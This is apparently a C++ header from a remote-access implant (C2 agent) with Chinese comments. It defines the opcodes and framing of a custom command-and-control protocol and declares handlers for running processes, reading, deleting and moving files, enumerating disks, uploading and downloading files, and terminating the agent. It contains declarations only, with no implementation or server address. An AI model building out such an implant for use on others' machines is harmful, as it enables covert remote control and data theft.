// 文件作用：命令分发器声明：定义命令编号和每个命令处理函数的接口。
#pragma once

#include <windows.h>
#include "Packer.h"
#include "Agent.h"

#ifndef DIRECT_HTTPS_LEARNING_MINIMAL
#define DIRECT_HTTPS_LEARNING_MINIMAL 0
#endif

#ifndef DIRECT_HTTPS_FILE_COMMANDS_ONLY
#define DIRECT_HTTPS_FILE_COMMANDS_ONLY 0
#endif

#ifndef DIRECT_HTTPS_HELLO_ONLY
#define DIRECT_HTTPS_HELLO_ONLY 0
#endif

// 文件功能档保留 hello、目录和文件 CRUD，去掉进程执行及传输任务路径。
#define COMMAND_PS_RUN       43
#define COMMAND_PWD          4
#define COMMAND_CD           8
#define COMMAND_LS           14
#define COMMAND_DISKS        15
#define COMMAND_CAT          24
#define COMMAND_MKDIR        27
#define COMMAND_RM           17
#define COMMAND_CP           12
#define COMMAND_MV           18
// COMMAND_DOWNLOAD (32) is defined in Downloader.h because downloader status
// packets and operator download tasks share the same result stream.
#define COMMAND_UPLOAD       33

// Development-only helpers currently exposed after the target commands.
#define COMMAND_HELLO        0x9001
#define COMMAND_JOBS_KILL    47
#define COMMAND_TERMINATE    10

// Internal upload transport opcode; not exposed as an operator command.
#define COMMAND_SAVEMEMORY   0x2321
#define COMMAND_ERROR        0x1111ffff

// 自研 v2 C2 envelope：只包住任务/结果外层，内部 opcode 和参数保持不变。
#define DIRECT_HTTPS_TASKS_V2_SCHEMA        1
#define DIRECT_HTTPS_TASKS_V2_HEADER_SIZE   20
#define DIRECT_HTTPS_RESULTS_V2_SCHEMA      1
#define DIRECT_HTTPS_RESULTS_V2_HEADER_SIZE 16
#define DIRECT_HTTPS_RESULTS_V2_BODY_OFFSET 12
#define DIRECT_HTTPS_ENVELOPE_FLAG_SECTIONED 0x00000001
#define DIRECT_HTTPS_SECTION_META 1
#define DIRECT_HTTPS_SECTION_LEGACY_RECORDS 2
#define DIRECT_HTTPS_SECTION_SCHEMA 3
#define DIRECT_HTTPS_SECTION_CAPABILITIES 0x0000000f
#define SELF_C2_SECTION_TASK_RECORD_V4 0x1010
#define SELF_C2_SECTION_RESULT_STREAM_V4 0x2020
#define SELF_C2_SECTION_RESULT_BUNDLE_V4 0x2021
#define SELF_C2_TASK_RECORD_V4_SCHEMA 1
#define SELF_C2_RESULT_STREAM_V4_SCHEMA 1
#define SELF_C2_RESULT_BUNDLE_V4_SCHEMA 1
#define SELF_C2_RESULT_CODEC_COMPAT_BODY 1
#define SELF_C2_RESULT_CODEC_NATIVE_FIELDS 2
#define SELF_C2_NATIVE_RESULT_RECORD_V4_SCHEMA 1
#define SELF_C2_NATIVE_RESULT_FIELD_TEXT 1
#define SELF_C2_NATIVE_RESULT_FIELD_PATH 2
#define SELF_C2_ACTION_HELLO 0x0101
#define SELF_C2_ACTION_RUN_PROCESS 0x0102
#define SELF_C2_ACTION_PWD 0x0201
#define SELF_C2_ACTION_CD 0x0202
#define SELF_C2_ACTION_LS 0x0203
#define SELF_C2_ACTION_CAT 0x0204
#define SELF_C2_ACTION_MKDIR 0x0205
#define SELF_C2_ACTION_RM 0x0206
#define SELF_C2_ACTION_COPY 0x0207
#define SELF_C2_ACTION_MOVE 0x0208
#define SELF_C2_ACTION_DISKS 0x0209
#define SELF_C2_ACTION_DOWNLOAD 0x0301
#define SELF_C2_ACTION_UPLOAD 0x0302
#define SELF_C2_ACTION_SAVE_MEMORY 0x0303
#define DIRECT_HTTPS_RESULTS_V2_LEGACY_LEN_OFFSET 48
#define DIRECT_HTTPS_RESULTS_V2_RECORD_OFFSET 52
#define SELF_C2_RESULTS_V4_BUNDLE_SECTION_LEN_OFFSET 48
#define SELF_C2_RESULTS_V4_BUNDLE_PAYLOAD_LEN_OFFSET 64
#define SELF_C2_RESULTS_V4_RECORD_OFFSET 68
#define SELF_C2_TASK_FRAME_V4_MAGIC0 'L'
#define SELF_C2_TASK_FRAME_V4_MAGIC1 'P'
#define SELF_C2_TASK_FRAME_V4_MAGIC2 'T'
#define SELF_C2_TASK_FRAME_V4_MAGIC3 '4'

class Agent;

// Commander 负责把任务 opcode 分派到具体命令处理函数。
class Commander
{
public:
	Agent* agent;

	// 构造函数保存 Agent 指针。
	Commander(Agent* agent);

	// ProcessCommandTasks 解析任务包并调用对应命令。
	void ProcessCommandTasks(BYTE* recv, ULONG recv_size, Packer* outPacker);

	// CmdCat 读取文件内容。
	void CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdCd 切换工作目录。
	void CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdCp 复制文件。
	void CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdDisks 枚举逻辑磁盘及其类型。
	void CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdDownload 创建文件下载任务。
	void CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdHello 返回测试文本。
	void CmdHello(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdJobsKill 终止后台 job。
	void CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdLs 列目录。
	void CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdMkdir 创建目录。
	void CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdMv 移动或重命名文件。
	void CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdPsRun 启动子进程执行命令。
	void CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdPwd 返回当前目录。
	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdRm 删除文件或目录。
	void CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdTerminate 让 agent 退出。
	void CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdUpload 写入服务端上传的文件。
	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdSaveMemory 保存上传分片。
	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// Exit 打包退出响应并停止 agent。
	void Exit(Packer* outPacker);

	// operator new 走自定义内存分配。
	static void* operator new(size_t sz);
	// operator delete 走自定义内存释放。
	static void operator delete(void* p) noexcept;
};
